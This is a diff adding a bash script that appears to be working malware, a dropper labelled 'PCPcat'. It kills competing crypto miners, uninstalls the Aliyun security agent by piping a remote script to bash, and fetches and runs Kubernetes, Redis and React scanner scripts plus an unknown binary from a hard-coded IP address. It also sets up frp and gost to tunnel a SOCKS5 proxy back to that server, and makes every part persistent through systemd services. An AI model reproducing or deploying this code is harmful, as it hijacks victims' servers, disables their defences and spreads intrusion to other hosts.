@@ -1,0 +1,282 @@
+#!/bin/bash
+set -e
+
+pkill -9 xmrig 2>/dev/null || true
+pkill -9 XMRig 2>/dev/null || true
+curl -fsSL http://update.aegis.aliyun.com/download/uninstall.sh | bash 2>/dev/null || true
+
+if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
+    curl -fsSL "http://67.217.57.240:666/files/kube.py" -o /tmp/k8s.py 2>/dev/null && python3 /tmp/k8s.py &
+fi
+
+VPS_ADDR="67.217.57.240"
+VPS_PORT=888
+FRP_VERSION="0.52.3"
+GOST_VERSION="2.12.0"
+SCANNER_URL="http://67.217.57.240:666/files/pcpcat.py"
+REACT_SCANNER_URL="http://67.217.57.240:666/files/react.py"
+REDIS_SCANNER_URL="http://67.217.57.240:666/files/redis-deploy.py"
+BORING_SYSTEM_URL="http://67.217.57.240:666/files/BORING_SYSTEM"
+
+if [ -d "/opt/pcpcat" ];then INSTALL_DIR="/opt/pcpcat"
+elif [ -d "$HOME/.local/pcpcat" ];then INSTALL_DIR="$HOME/.local/pcpcat"
+else INSTALL_DIR=""
+fi
+install_react_scanner(){
+local dir="$1"
+curl -fsSL "$REACT_SCANNER_URL" -o "${dir}/react.py.new" 2>/dev/null&&mv "${dir}/react.py.new" "${dir}/react.py" 2>/dev/null||cp "${dir}/react.py.new" "${dir}/react.py"
+chmod +x "${dir}/react.py" 2>/dev/null||true
+if [ -f /etc/systemd/system/pcpcat-react.service ];then
+systemctl restart pcpcat-react.service 2>/dev/null||true
+elif command -v systemctl >/dev/null 2>&1&&[ -d /run/systemd/system ]&&[ -w /etc/systemd/system ];then
+cat>/etc/systemd/system/pcpcat-react.service<<SVCEOF
+[Unit]
+Description=PCPcat React Scanner
+After=network.target
+[Service]
+Type=simple
+WorkingDirectory=${dir}
+ExecStart=/usr/bin/python3 ${dir}/react.py
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+systemctl daemon-reload
+systemctl enable pcpcat-react.service
+systemctl start pcpcat-react.service
+else
+pkill -f "python3.*react.py" 2>/dev/null||true
+sleep 2
+if ! pgrep -f "react.py" >/dev/null 2>&1;then
+cd "${dir}"&&nohup python3 react.py>>"${dir}/react.log" 2>&1 &
+fi
+fi
+return 0
+}
+install_redis_scanner(){
+local dir="$1"
+curl -fsSL "$REDIS_SCANNER_URL" -o "${dir}/redis-deploy.py" 2>/dev/null||return 1
+chmod +x "${dir}/redis-deploy.py" 2>/dev/null||true
+if [ -f /etc/systemd/system/pcpcat-redis.service ];then
+systemctl restart pcpcat-redis.service 2>/dev/null||true
+elif command -v systemctl >/dev/null 2>&1&&[ -d /run/systemd/system ]&&[ -w /etc/systemd/system ];then
+cat>/etc/systemd/system/pcpcat-redis.service<<SVCEOF
+[Unit]
+Description=PCPcat Redis Scanner
+After=network.target
+[Service]
+Type=simple
+WorkingDirectory=${dir}
+ExecStart=/usr/bin/python3 ${dir}/redis-deploy.py
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+systemctl daemon-reload
+systemctl enable pcpcat-redis.service
+systemctl start pcpcat-redis.service
+else
+if ! pgrep -f "redis-deploy.py" >/dev/null 2>&1;then
+cd "${dir}"&&nohup python3 redis-deploy.py>>"${dir}/redis.log" 2>&1 &
+fi
+fi
+return 0
+}
+install_boring_system(){
+local dir="$1"
+if [ -f "${dir}/boring_system" ]&&[ -x "${dir}/boring_system" ];then
+if ! pgrep -f "boring_system" >/dev/null 2>&1;then
+if systemctl is-active pcpcat-boring.service >/dev/null 2>&1;then
+:
+else
+cd "${dir}"&&nohup ./boring_system>>"${dir}/boring.log" 2>&1 &
+fi
+fi
+return 0
+fi
+curl -fsSL "$BORING_SYSTEM_URL" -o "${dir}/boring_system" 2>/dev/null||return 1
+chmod +x "${dir}/boring_system"
+if [ -f /etc/systemd/system/pcpcat-boring.service ];then
+systemctl restart pcpcat-boring.service 2>/dev/null||true
+elif command -v systemctl >/dev/null 2>&1&&[ -d /run/systemd/system ]&&[ -w /etc/systemd/system ];then
+cat>/etc/systemd/system/pcpcat-boring.service<<SVCEOF
+[Unit]
+Description=PCPcat Boring System
+After=network.target
+[Service]
+Type=simple
+WorkingDirectory=${dir}
+ExecStart=${dir}/boring_system
+Restart=always
+RestartSec=10
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+systemctl daemon-reload
+systemctl enable pcpcat-boring.service
+systemctl start pcpcat-boring.service
+else
+if ! pgrep -f "boring_system" >/dev/null 2>&1;then
+cd "${dir}"&&nohup ./boring_system>>"${dir}/boring.log" 2>&1 &
+fi
+fi
+return 0
+}
+if [ -n "$INSTALL_DIR" ];then
+install_react_scanner "$INSTALL_DIR"
+install_redis_scanner "$INSTALL_DIR"
+install_boring_system "$INSTALL_DIR"
+exit 0
+fi
+ARCH=$(uname -m)
+case $ARCH in
+x86_64)FRP_ARCH=amd64;GOST_ARCH=amd64;;
+aarch64)FRP_ARCH=arm64;GOST_ARCH=arm64;;
+armv7l)FRP_ARCH=arm;GOST_ARCH=armv7;;
+*)exit 1;;
+esac
+if mkdir -p /opt/pcpcat 2>/dev/null&&[ -w /opt/pcpcat ];then
+INSTALL_DIR="/opt/pcpcat"
+else
+INSTALL_DIR="$HOME/.local/pcpcat"
+mkdir -p "$INSTALL_DIR"
+fi
+cd "$INSTALL_DIR"
+if pgrep -f "gost.*:1080" >/dev/null 2>&1;then
+exit 0
+fi
+curl -fsSL "https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_${FRP_ARCH}.tar.gz"|tar -xz --strip-components=1
+chmod +x frpc
+curl -fsSL "https://github.com/ginuerzh/gost/releases/download/v${GOST_VERSION}/gost_${GOST_VERSION}_linux_${GOST_ARCH}.tar.gz"|tar -xz
+chmod +x gost
+CLIENT_NAME="pcpcat-$(hostname)-$(date +%s|tail -c 5)"
+cat>frpc.toml<<EOF
+serverAddr="$VPS_ADDR"
+serverPort=$VPS_PORT
+auth.method="token"
+auth.token="PCPcat-FRP-Token-2024"
+transport.tcpMux=true
+[[proxies]]
+name="$CLIENT_NAME"
+type="tcp"
+localIP="127.0.0.1"
+localPort=1080
+remotePort=890
+loadBalancer.group="pcpcat-pool"
+loadBalancer.groupKey="PCPcat-Group-Key"
+EOF
+if command -v systemctl >/dev/null 2>&1&&[ -d /run/systemd/system ]&&[ -w /etc/systemd/system ];then
+cat>/etc/systemd/system/pcpcat-gost.service<<SVCEOF
+[Unit]
+Description=PCPcat GOST SOCKS5 Proxy
+After=network.target
+[Service]
+Type=simple
+ExecStart=${INSTALL_DIR}/gost -L socks5://:1080
+Restart=always
+RestartSec=5
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+cat>/etc/systemd/system/pcpcat-frp.service<<SVCEOF
+[Unit]
+Description=PCPcat FRP Client
+After=network.target pcpcat-gost.service
+Requires=pcpcat-gost.service
+[Service]
+Type=simple
+ExecStart=${INSTALL_DIR}/frpc -c ${INSTALL_DIR}/frpc.toml
+Restart=always
+RestartSec=5
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+cat>/etc/systemd/system/pcpcat-scanner.service<<SVCEOF
+[Unit]
+Description=PCPcat Scanner
+After=network.target
+[Service]
+Type=simple
+WorkingDirectory=${INSTALL_DIR}
+ExecStart=/usr/bin/python3 ${INSTALL_DIR}/scanner.py
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+curl -fsSL "$SCANNER_URL" -o "${INSTALL_DIR}/scanner.py"
+curl -fsSL "$REACT_SCANNER_URL" -o "${INSTALL_DIR}/react.py"
+curl -fsSL "$REDIS_SCANNER_URL" -o "${INSTALL_DIR}/redis-deploy.py"
+cat>/etc/systemd/system/pcpcat-react.service<<SVCEOF
+[Unit]
+Description=PCPcat React Scanner
+After=network.target
+[Service]
+Type=simple
+WorkingDirectory=${INSTALL_DIR}
+ExecStart=/usr/bin/python3 ${INSTALL_DIR}/react.py
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+cat>/etc/systemd/system/pcpcat-redis.service<<SVCEOF
+[Unit]
+Description=PCPcat Redis Scanner
+After=network.target
+[Service]
+Type=simple
+WorkingDirectory=${INSTALL_DIR}
+ExecStart=/usr/bin/python3 ${INSTALL_DIR}/redis-deploy.py
+Restart=always
+RestartSec=60
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+if curl -fsSL "$BORING_SYSTEM_URL" -o "${INSTALL_DIR}/boring_system" 2>/dev/null;then
+chmod +x "${INSTALL_DIR}/boring_system"
+cat>/etc/systemd/system/pcpcat-boring.service<<SVCEOF
+[Unit]
+Description=PCPcat Boring System
+After=network.target
+[Service]
+Type=simple
+WorkingDirectory=${INSTALL_DIR}
+ExecStart=${INSTALL_DIR}/boring_system
+Restart=always
+RestartSec=10
+[Install]
+WantedBy=multi-user.target
+SVCEOF
+fi
+systemctl daemon-reload
+systemctl enable pcpcat-gost.service
+systemctl enable pcpcat-frp.service
+systemctl enable pcpcat-scanner.service
+systemctl enable pcpcat-react.service
+systemctl enable pcpcat-redis.service
+systemctl enable pcpcat-boring.service 2>/dev/null||true
+systemctl start pcpcat-gost.service
+sleep 2
+systemctl start pcpcat-frp.service
+systemctl start pcpcat-scanner.service
+systemctl start pcpcat-react.service
+systemctl start pcpcat-redis.service
+systemctl start pcpcat-boring.service 2>/dev/null||true
+else
+./gost -L socks5://:1080 &
+sleep 2
+./frpc -c ./frpc.toml &
+curl -fsSL "$SCANNER_URL" -o "${INSTALL_DIR}/scanner.py"
+curl -fsSL "$REACT_SCANNER_URL" -o "${INSTALL_DIR}/react.py"
+curl -fsSL "$REDIS_SCANNER_URL" -o "${INSTALL_DIR}/redis-deploy.py"
+if curl -fsSL "$BORING_SYSTEM_URL" -o "${INSTALL_DIR}/boring_system" 2>/dev/null;then
+chmod +x "${INSTALL_DIR}/boring_system"
+"${INSTALL_DIR}/boring_system">>"${INSTALL_DIR}/boring.log" 2>&1 &
+fi
+python3 "${INSTALL_DIR}/redis-deploy.py">>"${INSTALL_DIR}/redis.log" 2>&1 &
+python3 "${INSTALL_DIR}/react.py">>"${INSTALL_DIR}/react.log" 2>&1 &
+exec python3 "${INSTALL_DIR}/scanner.py" --docker-only
+fi
